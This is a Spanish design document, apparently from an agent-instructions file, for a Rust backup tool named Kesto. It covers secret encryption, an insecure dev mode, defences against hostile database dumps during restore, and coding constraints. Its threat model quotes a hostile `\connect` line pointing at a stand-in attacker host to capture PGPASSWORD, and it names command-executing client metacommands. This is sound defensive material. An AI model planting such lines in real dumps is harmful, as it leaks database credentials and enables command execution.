# Arquitectura e invariantes de diseño

> Extracto **literal** del `AGENTS.md` de Kesto (poda v2, 2026-10-31). Detalle del cifrado en reposo, del modo de desarrollo sin OIDC y justificación de las restricciones de diseño. El `AGENTS.md` conserva la regla imperativa de cada una.

### Cifrado en reposo

Los tres secretos del §3 —`repositories.secret_access_key`, `repositories.passphrase` y `backup_targets.db_password`— se guardan **cifrados**: el valor almacenado es el sobre `v1:<nonce>:<cifrado>` con AES-256-GCM y **nonce aleatorio por valor**, y la clave se deriva de `KESTO_MASTER_KEY` con HKDF-SHA256 y la etiqueta constante `kesto/secrets/v1` (que **no** es configurable: una etiqueta que se puede tocar por variable de entorno es una forma de perder los secretos sin haber rotado nada). Consecuencia que hay que saber: **rotar `KESTO_MASTER_KEY` deja ilegibles los secretos ya guardados** —no hay clave de datos envuelta por una clave rotable—, así que la rotación es una operación con plan y no un cambio de variable.

La clave maestra mide **32 caracteres como mínimo** y una más corta —o **vacía**— no avisa: **impide el arranque**. No es una formalidad: una clave vacía hace la derivación determinista y pública, así que cualquiera podría descifrar los secretos guardados, y con una corta la clave es forzable.

### Modo de desarrollo (sin OIDC)

Sin ninguna de las tres `OIDC_*` el modo es `Disabled`, y **no basta con `KESTO_MASTER_KEY`**: el modo de desarrollo exige el permiso explícito `KESTO_ALLOW_INSECURE=1` y una dirección de escucha de **loopback**, así que no se publica. En ese modo `GET /api/v1/health` contesta `auth_mode: "disabled"` —eso es lo que hay que consultar para comprobar qué modo está activo— y el arranque lo anuncia con un `WARN`.

El modo exige el **permiso explícito** `KESTO_ALLOW_INSECURE=1` **y** una dirección de escucha de **loopback**: sin el permiso el proceso se niega a arrancar, y con él `BIND_ADDRESS=0.0.0.0:8080` sigue siendo error. Es lo que convierte un despliegue que perdió sus `OIDC_*` en un arranque fallido en vez de un panel abierto en el puerto publicado.

⚠️ Ese modo **no pone ninguna capa**: la mitad protegida no se monta, todo `/api/v1/*` queda abierto y `/api/v1/auth/*` ni siquiera existe —contesta `404` con la envoltura, **no** `401`—. La única excepción es la gestión de tokens (`/api/v1/tokens*`), que tampoco se monta: sin credencial que exigir, un token emitido así sobreviviría al cambio de modo —su hash queda en la base y no depende de quién lo pidió—, así que la ruta contesta `404`. Es para desarrollo, no para un despliegue expuesto. Con las tres `OIDC_*` configuradas, en cambio, todo `/api/v1/*` exige sesión salvo la salud y las dos rutas públicas del flujo de entrada.


### Frontera de confianza: el repositorio de copias

El volcado que la restauración entrega al cliente de la base sale de un repositorio S3 **que configura el operador**, con credenciales que el operador elige. Que la restauración exija un `snapshot_id` vinculado a una `job_execution` impide restaurar la instantánea de un repositorio ajeno, pero **no** impide que el repositorio propio esté comprometido o sustituido. Dentro de esa frontera el contenido es **no confiable**, y se entrega a un intérprete que corre como `root` en el contenedor destino: los metacomandos de cliente —`.shell` de `sqlite3`, `\!` de `mariadb` y `psql`— serían ejecución de órdenes dentro del contenedor. La restauración los trata como hostiles.

Cada cliente se invoca en el modo que los ignora:

| Cliente | Modo | Qué corta |
|---|---|---|
| `sqlite3` | `-safe` (SQLite ≥ 3.27) | `.shell`, `.system`, `.read`, `.import`, `.output`, `.once`, `ATTACH`, `load_extension()` |
| `mariadb` | `--binary-mode` | Todo comando de cliente salvo `\C` y `DELIMITER` |
| `psql` | `-X`, el volcado troceado con los metacomandos de primer nivel descartados, y `\restrict <nonce>` | Todo metacomando de primer nivel |

Un `sqlite3` que no soporte `-safe` **hace fallar la restauración** en vez de degradarse: el fallo se registra con el error del contenedor, no se silencia.

**Por qué PostgreSQL se trocea.** `pg_dumpall` separa las bases con metacomandos `\connect`, y el único modo de `psql` que rechaza metacomandos —`\restrict`— **bloquea `\connect`**: anteponerlo a un volcado global desvía los datos a la base equivocada. Por eso el volcado se trocea por los `\connect` de **primer nivel** y se restaura con un `psql -d <base>` por sección, sin materializar el volcado. El troceador (`src/engine/troceador.rs`) reconoce el estado léxico del volcado —comilla simple, comilla doble, dólar `$etiqueta$`, comentario de línea, comentario de bloque **anidable** y bloque `COPY … FROM stdin`— y el estado **atraviesa las líneas**, de modo que un `\connect` dentro de un literal, de un cuerpo de función o de los datos de un `COPY` no es una frontera. Los bordes están verificados con `psql 18.6` y fijados con test: el metacomando se reconoce por el **primer byte no blanco** con el juego de blancos **completo** de `psql` —`[ \t\n\r\f\v]`, así que `\f\!`, `\v\!` y `\r\!` también se descartan, no solo los precedidos de espacio o tabulador—; en un literal `E'…'` la barra invertida escapa, así que `\'` **no** cierra el literal; el `COPY … FROM stdin` se detecta como lo detecta el cliente —letra inicial de los identificadores de primer nivel, tope ocho, sin los de paréntesis, y decisión al `;` a profundidad cero—, no por subcadena; y el `\connect` admite su alias `\c`, exige que la palabra termine ahí, y no abre sección cuando va sin nombre.

**La capa 2 es una precondición comprobada en tiempo de ejecución.** El descarte de metacomandos es la guarda **principal** —no depende de la versión del cliente y se lleva también el `\unrestrict` que trajera un volcado hostil—; `\restrict <nonce>` es la **segunda** capa, y no es opcional: antes de leer una sola línea del volcado, la restauración ejecuta `psql --version` con el mismo binario que usará el reparto y, si el cliente **no** honra `\restrict` —exige 17.6, o el mínimo de su rama: 16.10, 15.14, 14.19, 13.22; PostgreSQL 18 lo trae de serie—, la restauración **falla** nombrando el contenedor, la versión y el mínimo, y **no restaura nada**. El porqué: la capa 1 es código nuestro y su fallo no se ve venir; sin la capa 2, un metacomando que se le escape al troceador se ejecutaría como `root` en el contenedor destino, y «la capa 1 sigue en pie» no es una garantía de producción sino algo que la batería verifica a mano.

**El nombre de base del `\connect` no puede tener forma de cadena de conexión.** `psql -d <valor>` lee el valor como *conninfo* —y de ahí saca `host`, `port`, `user`, `dbname`, `sslmode`…— si **contiene un `=`** o si es una URI con el esquema `postgres://` o `postgresql://`, que son los dos que reconoce libpq (verificado contra `psql` 18.6). Un volcado hostil con `\connect "host=atacante.example dbname=postgres"` llevaría la conexión al servidor del atacante **con `PGPASSWORD` puesto**. La restauración lo **rechaza** —fail-closed— **antes** de componer la orden de la sección: **falla** sin ejecutar esa sección ni las siguientes, y el motivo nombra el contenedor y la forma del nombre, nunca el valor. La base de la **primera** sección no se valida: la elige el operador en la configuración del target, no viene del volcado.

**Un error de SQL dentro de una sección todavía no se detecta (#175).** `psql` **sin** `ON_ERROR_STOP` sale con `0` ante un error de SQL, así que la garantía real de la ejecución por secciones es «se falla cuando una orden sale con un código distinto de cero»: una sección cuyas sentencias fallaron **se da por buena**. Detectar esos errores es una decisión de política de restauración aparte y va por su cuenta (issue **#175**).

**El residual aceptado: `COPY … FROM PROGRAM`.** Es SQL, no un metacomando: `\restrict` no lo corta y exige superusuario —o el rol `pg_execute_server_program`— en el servidor destino. Los targets suelen usar un usuario administrador, así que el vector es real, pero **no se corta recortando privilegios que la restauración necesita** (crear bases, roles, extensiones). Se acepta y se documenta; su sitio natural es la separación de privilegio del motor.

## Restricciones de diseño que un agente rompería por defecto

- **Un worker secuencial por repositorio S3**, no un task de Tokio por job. `rustic_core` toma un lock exclusivo del repositorio: paralelizar backups del mismo repo los bloquea entre sí. Cola MPSC + un worker por `repository_id`.
- **Streaming en memoria, sin ficheros temporales**: `stdout` del `exec` de bollard → `AsyncRead` en un buffer de Tokio → `NodeWriter`/`TreeBuilder` de `rustic_core`. No escribas el dump a disco ni a `/tmp`.
- **Un único stream SSE global** en `GET /api/v1/events`, con `event: <nombre>` (`execution_progress`, …) y el payload literal de §5. No inventes otro esquema de mensaje.
- **Las migraciones se nombran con un prefijo numérico entero** (`0001_init.sql`), no con la forma `V001__init.sql` del estilo de Flyway: `sqlx::migrate!()` parte el nombre por el primer `_` y hace `parts[0].parse::<i64>()`, así que la forma con `V` **no compila**. Y `migrations/` tiene que existir antes del primer `cargo check` que incluya la macro, porque la resuelve en tiempo de compilación.
- **Nunca enlaces un `Uuid` de `sqlx` contra una columna `TEXT`**: `sqlx` lo escribe como un **BLOB de 16 bytes** y lo descodifica con `Uuid::from_slice`, así que deja los identificadores ilegibles para `sqlite3`. La capa de acceso escribe y lee la forma canónica con guiones (`uuid::fmt::Hyphenated`).
- **`foreign_keys` va en las opciones de conexión del pool**, nunca en un `PRAGMA` suelto: es una opción *por conexión* y está apagada por defecto, así que un `PRAGMA` ejecutado una vez solo afecta a una conexión del pool y el `ON DELETE CASCADE` **no ocurre sin que nada lo delate**.
- **El arnés de captura de registro (`src/test_support.rs`) instala un suscriptor global y elige el buffer por hilo**: nunca `set_default` ni `with_default`. Un despachante de hilo deja un callsite cacheado como `Interest::never` para todo el proceso y su registro desaparece **en silencio** —el síntoma es «el log está vacío», no «el arnés está roto»—, y solo se manifiesta en CI (2 CPUs), no en local.

